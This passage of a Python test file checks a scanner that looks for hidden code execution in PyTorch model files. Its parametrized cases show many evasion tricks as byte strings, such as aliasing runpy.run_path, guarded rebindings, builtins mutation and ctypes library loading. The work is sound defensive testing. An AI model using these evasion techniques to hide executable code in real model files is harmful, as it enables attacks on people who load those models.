        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + padding
            + safe_rebind
            + b"(runner)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_parenthesized_alias_restored_after_visible_safe_rebind(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + padding
            + b"original = runner\n"
            + b"runner = print\n"
            + b"runner = original\n"
            + b"(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("late_state", "expect_finding"),
        [
            (
                b"original = runner\nrunner = original\noriginal = print\n(runner)('payload.py')\n",
                True,
            ),
            (
                b"original = print\nrunner = original\noriginal = runner\n(runner)('safe')\n",
                False,
            ),
        ],
    )
    def test_scan_model_resolves_late_parenthesized_alias_dependencies_at_rebind_time(
        self, late_state: bytes, expect_finding: bool
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"from runpy import run_path as runner\n" + padding + late_state + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

        assert has_dynamic_finding is expect_finding

    def test_scan_model_ignores_passive_alias_members_before_late_parenthesized_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        passive_members = b"".join(f"rp.mark_{index} = {index}\n".encode() for index in range(8))
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + passive_members
            + b"((rp).run_path)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_safe_member_overwrite_after_passive_alias_members(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        passive_members = b"".join(f"rp.mark_{index} = {index}\n".encode() for index in range(8))
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + passive_members
            + b"rp.run_path = print\n"
            + passive_members
            + b"((rp).run_path)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("late_state", "expect_finding"),
        [
            (b"if False:\n    runner = print\n(runner)('payload.py')\n", True),
            (b"if False:\n    # inert\n    runner = print\n(runner)('payload.py')\n", True),
            (b"if True:\n    runner = print\n(runner)('safe')\n", False),
            (b"if True:\n    # inert\n    runner = print\n(runner)('safe')\n", False),
        ],
    )
    def test_scan_model_handles_constant_guarded_late_alias_rebindings(
        self, late_state: bytes, expect_finding: bool
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"from runpy import run_path as runner\n" + padding + late_state + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

        assert has_dynamic_finding is expect_finding

    @pytest.mark.parametrize(
        ("guard", "expect_finding"),
        [(b"False", False), (b"True", True), (b"enabled", True)],
    )
    def test_scan_model_honors_guarded_forwarded_runpy_alias_after_priority_window(
        self,
        guard: bytes,
        expect_finding: bool,
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy\n"
            + b"if "
            + guard
            + b":\n    runner = runpy.run_path\nrunner('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

        assert has_dynamic_finding is expect_finding

    def test_scan_model_detects_constant_guarded_late_alias_restore(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + b"original = runner\n"
            + b"runner = print\n"
            + padding
            + b"if True:\n    runner = original\n(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "restore",
        [
            b"if False:\n    pass\nelse:\n    runner = original\n",
            b"if True:\n    if True:\n        runner = original\n",
        ],
    )
    def test_scan_model_detects_compound_late_alias_restore(self, restore: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + b"original = runner\nrunner = print\n"
            + padding
            + restore
            + b"(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"runner = rp.run_path if False else print\n(runner)('safe')\n",
            b"runner = print if 1 else rp.run_path\n(runner)('safe')\n",
            b"runner = rp.run_path and print\n(runner)('safe')\n",
            b"runner = True or rp.run_path\n(runner)('safe')\n",
            b"runner = print or rp.run_path\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif False:\n    if True:\n"
            + b"        runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif True:\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif 1:\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif False:\n    pass\nelif True:\n    pass\nelse:\n"
            + b"    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif 'enabled':\n    pass\nelse:\n"
            + b"    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif True:\n    pass\nelif False:\n    pass\nelse:\n"
            + b"    runner = original\n(runner)('safe')\n",
            b"if globals().get('enabled'):\n    runner = print\nelif True:\n    runner = print\n(runner)('safe')\n",
            b"getattr(object=rp, name='run_path')('safe')\n",
        ],
    )
    def test_scan_model_preserves_definitely_safe_late_conditional_alias_state(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\nfrom runpy import run_path as runner\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"enabled = True\nrunner = rp.run_path if enabled else print\n"
            + b"if globals().get('safe'):\n    runner = print\n(runner)('payload.py')\n",
            b"from runpy import run_path as runner\nif globals().get('enabled'):\n    pass\n"
            + b"elif True:\n    runner = print\n(runner)('payload.py')\n",
            (
                b"from runpy import run_path as runner\noriginal = runner\nif globals().get('safe'):\n"
                + b"    runner = print\n    if globals().get('restore'):\n        runner = original\n"
                + b"else:\n    runner = print\n(runner)('payload.py')\n"
            ),
            b"from runpy import run_path as runner\nprint = runner\nif globals().get('enabled'):\n"
            + b"    runner = print\nelse:\n    runner = print\n(runner)('payload.py')\n",
            b"\x00\xfffrom runpy import run_path as runner\nprint = runner\nif globals().get('enabled'):\n"
            + b"    runner = print\nelse:\n    runner = print\n(runner)('payload.py')\n",
        ],
    )
    def test_scan_model_detects_late_alias_after_uncertain_safe_overwrite(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"import builtins\nbuiltins.print = False\nrunner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins)['print'] = False\n"
            + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins).update({'print': False})\n"
            + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
            + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins).update(**{'print': False})\n"
            + b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"from runpy import run_path as runner\nFalse and (runner := print)\n(runner)('payload.py')\n",
            (
                b"from runpy import run_path as runner\nclass Broken:\n"
                b"    def __enter__(self):\n        raise RuntimeError()\n"
                b"    def __exit__(self, *args):\n        return False\n"
                b"try:\n    with Broken() as runner:\n        pass\n"
                b"except RuntimeError:\n    pass\n(runner)('payload.py')\n"
            ),
        ],
    )
    def test_scan_model_detects_late_alias_after_non_executed_safe_shadow(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_retained_alias_after_raising_late_with_shadow(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        late_state = (
            b"class Broken:\n    def __enter__(self):\n        raise RuntimeError()\n"
            b"    def __exit__(self, *args):\n        return False\n"
            b"try:\n    with Broken() as runner:\n        pass\n"
            b"except RuntimeError:\n    pass\n(runner)('payload.py')\n"
        )
        source = b"\x00\xfffrom runpy import run_path as runner\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_forwarded_late_ctypes_attribute_load(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport ctypes as c\n" + padding + b"loader = c.cdll\nloader.msvcrt\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
                b"opener = print or wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\nvars(builtins).update(**{'print': False})\n"
                b"opener = print or wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins\nvars(builtins).update(**{'print': False})\n"
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nfor b.print in [False]:\n    pass\n"
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nns = b.vars(b)\nupdate = ns.update\n"
                b"update({'print': False})\nloader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_boolean_fallback_after_static_builtin_mapping_mutation(
        self, prefix: bytes, late_state: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + prefix + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "unexpected_pattern"),
        [
            (
                b"import runpy as rp\n",
                b"runner = print or rp.run_path\nrunner('safe')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"opener = print or wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_safe_boolean_fallback_after_builtin_restore(
        self, prefix: bytes, late_state: bytes, unexpected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        state = (
            b"import builtins\noriginal = builtins.print\n"
            b"vars(builtins)['print'] = False\nvars(builtins).update({'print': original})\n"
        )
        source = b"\x00\xff" + prefix + padding + state + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == unexpected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "unexpected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"wb.open = print\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.cdll = print\nloader = c.cdll\nloader.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"vars(wb).update(open=print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.__dict__['CDLL'] = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nb.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nfor b.setattr in []:\n    pass\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nfor b.list in ():\n    pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"wb.__dict__.update({'open': print})\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"vars(wb).update(**{'open': print})\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.__dict__.__setitem__('CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"dict.update(c.__dict__, CDLL=print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"dict.update(c.__dict__, [('CDLL', print)])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.__dict__.update([('CDLL', print)])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.__dict__.__ior__({'CDLL': print})\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"dict.__ior__(c.__dict__, {'CDLL': print})\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\ndel c.CDLL\nc.__dict__.setdefault('CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\ndel c.CDLL\ndict.setdefault(c.__dict__, 'CDLL', print)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\ndel c.__dict__['CDLL']\nc.__dict__.setdefault('CDLL', print)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\nc.__dict__.pop('CDLL')\nc.__dict__.setdefault('CDLL', print)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL; c.__dict__.setdefault('CDLL', print)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ndel c.CDLL\n"
                b"dict.__setitem__(c.__dict__, 'CDLL', print)\nc.__dict__.setdefault('CDLL', original)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\ndict.pop(c.__dict__, 'CDLL')\nc.__dict__.setdefault('CDLL', print)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\ndelattr(c, 'CDLL')\nc.__dict__.setdefault('CDLL', print)\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\nbuiltins.setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"wb.__dict__['op' + 'en'] = print\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"vars(c).update(**{'CD' + 'LL': print})\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = original\noriginal = print\nwb.open = original\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"wb.open: object = print\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"namespace = wb.__dict__\nnamespace.update(open=print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"namespace, unused = wb.__dict__, None\nnamespace.update(open=print)\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\ntry:\n    pass\nfinally:\n    wb.open = print\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"wb.open = print\nwb.open = wb.open\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"changed = setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nnamespace = wb.__dict__\nnamespace |= {'open': print}\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\ntry:\n    wb.open = print\nexcept Exception:\n    pass\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nfor _ in [0]:\n    wb.open = print\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\nimport builtins\n",
                b"False and setattr(builtins, 'setattr', print)\nbuiltins.setattr(wb, 'open', print)\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"changed = (setattr(wb, 'open', print) is None)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"noop = lambda arg=setattr(wb, 'open', print): arg\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"def noop(arg: wb.__dict__.update(open=print)):\n    pass\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nFalse and (print := original)\nwb.open = print\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"False and (setattr := print)\nsetattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ntry:\n    raise RuntimeError()\n"
                b"    wb.open = original\nexcept RuntimeError:\n    pass\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"try:\n    raise RuntimeError()\nexcept RuntimeError:\n    wb.open = print\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ntry:\n    1 / 0\n    wb.open = original\n"
                b"except ZeroDivisionError:\n    pass\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"for _ in [0]:\n    pass\nelse:\n    wb.open = print\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nwhile False:\n    wb.open = original\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"try:\n    raise FileNotFoundError()\nexcept OSError:\n    wb.open = print\n"
                b"opener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    raise PermissionError()\nexcept OSError:\n    c.CDLL = print\n"
                b"loader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"list(wb.__dict__.update(open=print) for _ in [0])\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"sorted(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"for _ in [0]:\n    try:\n        raise RuntimeError()\n    except RuntimeError:\n        pass\n"
                b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"if c.__dict__.update(CDLL=print) is None:\n    pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"builtins.list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\n",
                b"b.list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"RuntimeError = ValueError\ntry:\n    raise RuntimeError()\nexcept ValueError:\n"
                b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"ValueError = RuntimeError\ntry:\n    raise RuntimeError()\nexcept ValueError:\n"
                b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"try:\n    raise RuntimeError(c.__dict__.update(CDLL=print))\nexcept RuntimeError:\n"
                b"    pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"with (c.__dict__.update(CDLL=print) or contextlib.nullcontext()):\n"
                b"    pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"match c.__dict__.update(CDLL=print):\n    case _:\n        pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"for c.CDLL in [print]:\n    pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"match 0:\n    case 0 if c.__dict__.update(CDLL=print) is None:\n"
                b"        pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"subject = 0\nmatch subject:\n    case _ if c.__dict__.update(CDLL=print) is None:\n"
                b"        pass\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"builtins.ValueError = RuntimeError\ntry:\n    raise RuntimeError()\nexcept ValueError:\n"
                b"    c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"list = lambda iterable: None\nlist = builtins.list\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"for list in [builtins.list]:\n    pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"else:\n    real_vars = lambda obj: {}\n"
                b"real_vars(b).update({'setattr': lambda *args: None})\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nfor _ in [0]:\n    continue\n"
                b"    wb.open = original\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
